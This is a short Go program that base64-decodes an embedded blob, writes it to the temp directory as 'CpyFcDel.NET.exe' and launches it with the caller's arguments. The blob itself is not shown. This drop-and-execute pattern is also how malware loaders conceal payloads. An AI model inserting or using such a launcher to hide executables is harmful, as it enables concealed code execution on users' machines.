package main

import (
    b64 "encoding/base64"
	"os"
	"os/exec"
	"path"
	"io/ioutil"
)

func main() {
	tmpDir := os.TempDir()
	filename := path.Join(tmpDir, `CpyFcDel.NET.exe`)
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		sDec, _ := b64.StdEncoding.DecodeString(Data)
		ioutil.WriteFile(filename, []byte(sDec), 0644)
	}
	cmd := exec.Command(filename, os.Args[1:]...)
	cmd.Start()
}
